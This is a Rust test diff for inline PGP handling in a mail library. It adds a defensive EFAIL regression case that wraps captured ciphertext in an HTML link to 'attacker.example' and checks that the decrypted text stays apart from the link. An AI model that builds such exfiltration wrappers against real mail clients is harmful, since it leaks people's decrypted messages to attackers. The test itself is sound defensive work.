@@ -383,6 +383,21 @@ fn inline_pgp() {
     assert!(opened.security.signatures[0].verified());
     assert_eq!(text_of(&opened.raw).trim(), "Grüße aus Berlin");
 
+    // The same block wrapped by someone who captured it (EFAIL): the
+    // opened text stays apart from theirs, so it cannot end up in their
+    // link.
+    let mut raw =
+        format!("From: {ADA}\r\nSubject: Inline\r\nContent-Type: text/plain\r\n\r\n<html><a href=\"https://attacker.example/?d=").into_bytes();
+    raw.extend_from_slice(ciphertext.trim_ascii_end());
+    raw.extend_from_slice(b"\r\n\">Open</a></html>\r\n");
+    let opened = open(&raw, &gnupg).expect("protected");
+    assert!(opened.security.decrypted());
+    assert!(!opened.security.whole, "the wrapper is not encrypted");
+    let text = text_of(&opened.raw);
+    assert!(text.contains("?d=\n\nGrüße aus Berlin"), "{text}");
+    assert!(text.contains("Grüße aus Berlin\n\n"), "{text}");
+    assert!(text.contains("\">Open"), "{text}");
+
     // Clear-signed, in Latin-1 and quoted-printable, with a note above.
     let latin1 = b"Gr\xfc\xdfe aus Berlin\n";
     let signed = home.gpg(&["--clearsign", "--local-user", ADA], latin1);
